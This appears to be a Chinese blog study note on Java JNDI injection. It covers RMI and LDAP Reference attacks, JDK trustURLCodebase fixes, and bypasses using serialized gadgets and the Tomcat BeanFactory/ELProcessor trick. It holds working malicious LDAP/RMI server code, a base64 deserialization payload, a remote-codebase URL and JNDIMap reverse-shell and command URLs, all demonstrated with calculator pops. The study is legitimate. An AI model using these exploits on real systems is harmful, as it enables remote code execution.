---
tags:
  - java安全
title: jndi注入
date: 2025-03-07
---

# attack
## marshalsec
这里就先只给一个例子吧，其实说明文档里面还有很多其它的用法。

```java
public class JndiCalc {
    public JndiCalc() throws Exception {
        Runtime.getRuntime().exec("open -a Calculator");
    }
}
```

```java
➜  classes ls
Calc.class           JndiCalc.class
Calc.jar             TemplatesBytes.class
➜  classes python3 -m http.server 7777
```

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#TestCalc" 1389
#或者rmi服务
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:8000/#TestCalc" 1099
```

```java
  public static void main(String[] args) throws Exception{
      InitialContext initialContext = new InitialContext();
      RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:9999/JndiCalc");
  }
```
## JNDI-Injection-Exploit
```
java -jar JNDI-Injection-Exploit.jar -C "open -a Calculator" -A 127.0.0.1
```

## JNDIMap
最终就选择jndimap吧。
这个工具就比较傻瓜式了。
```
# 发起 DNS 请求
ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
ldap://127.0.0.1:1389/Basic/DNSLog/eHh4LmRuc2xvZy5jbg==

# 命令执行
ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y

# 加载自定义 Class 字节码

# URL 传参加载
ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
# 从运行 JNDIMap 的服务器上加载
ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # 相对于当前路径
ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>

# 原生反弹 Shell (支持 Windows)
ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
ldap://127.0.0.1:1389/Basic/ReverseShell/MTI3LjAuMC4x/NDQ0NA==
```
# 原理

## RMI

首先是定义一个接口
```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface RemoteObj extends Remote {

    public String sayHello(String keywords) throws RemoteException;
}
```
接口实现
```java
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Locale;

public class RemoteObjImpl extends UnicastRemoteObject implements RemoteObj {

    public RemoteObjImpl() throws RemoteException {
        //     UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出
    }

    @Override
    public String sayHello(String keywords) throws RemoteException {
        String upKeywords = keywords.toUpperCase();
        System.out.println(upKeywords);
        return upKeywords;
    }
}
```

最后再去绑定
```java
import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
    }
}
```

上面那个是jndi的方法，下面这个是rmi的方法。server和client都得是同一个 package `package Server;`

```java
public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {
        // 实例化远程对象
        RemoteObj remoteObj = new RemoteObjImpl();
        // 创建注册中心
        Registry registry = LocateRegistry.createRegistry(1099);
        // 绑定对象示例到注册中心
        registry.bind("remoteObj", remoteObj);
    }
}
```

客户端的话也是需要去定义那个接口的。
```java
import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```

上面是jndi的，下面这个是rmi的。
```java
public class RMIClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        RemoteObj remoteObj = (RemoteObj) registry.lookup("remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

可以感受一下jndi和rmi这两种方法的不同。

然后客户端就可以去调用到服务端的sayhello方法了。

这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的 `lookup()` 方法。

所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。

## Normal Jndi
## JNDI绑定Reference

8u121之前

其实一共就有2个一个是我们的注册中，然后这个Reference累加在的时候需要去urlclassloader里面读取我们的而已class。
jndi这一块其实出了搞安全的研究一下，其他的人真的是找不到相应的文章。然后jdk版本要求121之前，我的mac很明显是无法复现成功的。

```java
public class JNDIRMIServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
      
        Reference reference = new Reference("JndiCalc","JndiCalc7","http://localhost:7777/");
        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
    }
}
```

服务端大概就是这个样子的，但是那个JndiCalc，用python开一个临时的http就可以了。内容大概如下。

```java
public class JndiCalc7 {
    public JndiCalc7() throws Exception {
        Runtime.getRuntime().exec("open -a Calculator");
    }
}
```
```
Reference("JndiCalc","JndiCalc7","http://localhost:7777/");
	InitialContext.rebind("rmi://localhost:1099/remoteObj", reference);
		GenericURLContext.rebind(name, obj)
			registry.rebind(name.get(0), encodeObject(obj, name.getPrefix(1))) //encode将Reference转化为ReferenceWrapper
				RegistryImpl_Stub.rebind
```


```java
InitialContext initialContext = new InitialContext();  
RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
```
```
InitialContext.lookup("rmi://localhost:1099/remoteObj");
	GenericURLContext.lookup()
		RegistryContext.lookup()
			RegistryImpl_Stub.lookup()
		decodeObject(obj, name.getPrefix(1))
		NamingManager.getObjectInstance(obj, name, this, environment);
			getObjectFactoryFromReference(ref, f);
			clas = helper.loadClass(factoryName, codebase)   // 注意 codebase 这个加载器。
			clas.newInstance()
```
## 修复
trustURLCodebase
```
if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {  
    throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");  
} else {  
    return NamingManager.getObjectInstance(var3, var2, this, this.environment);  
}
```

## Jndi 结合 ldap
```
InitialContext.lookup("ldap://localhost:1099/remoteObj");
	ldapURLContext.lookup(name);
		GenericURLContext.lookup(name);
			PartialCompositeContext.lookup(res.getRemainingName())
				ComponentContext.p_lookup(nm, cont);
					LdapCtx.c_lookup(res.getHead(), cont);
						Obj.decodeObject(attrs);
							decodeReference(attrs, codebases);
							new Reference(className, factory,  (codebases != null? codebases[0] : null));
					DirectoryManager.getObjectInstance(obj, name, this, envprops, attrs);
						NamingManager.getObjectFactoryFromReference(ref, f);
						helper.loadClass(factoryName, codebase);
```
这个 attrs 就是下面ldap server的这个 e。这几个值可以调试分析一下。
```java
e.addAttribute("javaCodeBase", cbstring);
e.addAttribute("objectClass", "javaNamingReference");
e.addAttribute("javaFactory", this.codebase.getRef());
```
ldap 是一种协议，并不是 Java 独有的。
这里的话其实server的版本都是无所谓的主要是客户段。
python3 -m http.server 7777
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;


// jndi 绕过 jdk8u191 之前的攻击
public class JNDILdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main (String[] args) {
        String url = "http://127.0.0.1:7777/#JndiCalc7";
        int port = 1099;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

```java
import javax.naming.InitialContext;

// jndi 打 jdk8u191 之前版本的客户端
public class JNDILdapClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj) initialContext.lookup("ldap://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```

注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。

## 高版本修复手段
8u191
trustURLCodebase默认
```java
        // 旧版本JDK  
        /**
         * @param className A non-null fully qualified class name.  
         * @param codebase A non-null, space-separated list of URL strings.  
         */
        public Class<?> loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException {

            ClassLoader parent = getContextClassLoader();
            ClassLoader cl = URLClassLoader.newInstance(getUrlArray(codebase), parent);
            return loadClass(className, cl);
        }


// 新版本JDK  
        /**
         * @param className A non-null fully qualified class name.  
         * @param codebase A non-null, space-separated list of URL strings.  
         */
        public Class<?> loadClass(String className, String codebase) throws ClassNotFoundException, MalformedURLException {
            if ("true".equalsIgnoreCase(trustURLCodebase)) {
                ClassLoader parent = getContextClassLoader();
                ClassLoader cl =
                        URLClassLoader.newInstance(getUrlArray(codebase), parent);

                return loadClass(className, cl);
            } else {
                return null;
            }
        }
```

**在使用 `URLClassLoader` 加载器加载远程类之前加了个if语句检测**

根据 `trustURLCodebase的值是否为true` 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 `trustURLCodebase 的值是否为 true` 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。

下面我们来讲 jdk8u191 版本之后的绕过手段。

## 191之后

## 利用 LDAP 返回序列化数据，触发本地 Gadget
java -jar ysoserial.jar CommonsCollections1 "open -a Calculator"|base64
比如当时 2022 蓝帽杯，好像有道题目就是 fastjson 绕过高版本 jdk 攻击。
就先拿蓝帽杯那一道题目来开刀吧。

```java
import com.unboundid.util.Base64;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class JNDIGadgetServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://vps:8000/#ExportObject";
        int port = 1234;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         * */ public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */ @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            // Payload1: 利用LDAP+Reference Factory
//            e.addAttribute("javaCodeBase", cbstring);
//            e.addAttribute("objectClass", "javaNamingReference");
//            e.addAttribute("javaFactory", this.codebase.getRef());

            // Payload2: 返回序列化Gadget
            try {
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAQWJhc2ggLWMge2VjaG8sYjNCbGJpQXRZU0JEWVd4amRXeGhkRzl5Q2c9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9dAAEZXhlY3VxAH4AHgAAAAFxAH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="));
            } catch (ParseException exception) {
                exception.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

```java
import com.alibaba.fastjson.JSON;

import javax.naming.Context;
import javax.naming.InitialContext;

// JNDI 高版本 Gadget 打
public class JNDIGadgetClient {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发
        Context context = new InitialContext();
        context.lookup("ldap://localhost:1234/ExportObject");

    }
}
```

## 本地恶意 Class 作为 Reference Factory
https://tttang.com/archive/1405/   这个里面有很多的例子。这里说最经典的这个。 ELProcessor 。

```java
InitialContext.lookup()
	GenericURLContext.lookup()
		RegistryContext.lookup()
		obj = RegistryImpl_Stub.lookup(name.get(0));
			RegistryContext.decodeObject();
				NamingManager.getObjectInstance(obj, name, this, environment);
					BeanFactory.getObjectInstance();
					method.invoke(bean, valueArray);
					

```

```java
import javax.el.ELProcessor;  
  
public class Test {  
    public static void main(String[] args) throws Exception {  
        ELProcessor elProcessor = new ELProcessor();  
        elProcessor.eval( "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +  
                ".newInstance().getEngineByName(\"JavaScript\")" +  
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")");  
    }  
}
```

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

// JNDI 高版本 jdk 绕过服务端，用 bind 的方式
public class JNDIBypassHighJavaServerEL {
    public static void main(String[] args) throws Exception {
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");
        Registry registry = LocateRegistry.createRegistry(1099);

        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true,"org.apache.naming.factory.BeanFactory",null);

        // forceString 是固定的，反射调用ELProcessor , eval函数， 等号前面的为变量。后面给x赋值。
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'open -a Calculator']).start()\")"));
        System.out.println("[*]Evil command: calc");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
}
}
```

```java
import org.apache.naming.factory.BeanFactory;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.spi.NamingManager;

public class JNDIBypassHighJavaClient {
    public static void main(String[] args) throws Exception {
        String uri = "rmi://localhost:1099/Object";
        Context context = new InitialContext();
        context.lookup(uri);
    }
}
```

## tomcat修复

其实我如果想要知道是怎么修复的。还是要对这个流程有一个大致的了解。

然而在高版本Tomcat中，移除了`forceString`进行任意方法调用的机制，下图为Tomcat 8.5.79版本下的`BeanFactory#getObjectInstance`方法，若在Reference中存在有`forceString`则抛出异常

但是依旧可以调用任意的set方法。
## tomcat高版本绕过
https://xz.aliyun.com/news/16156
挖个坑，以后有机会再看。
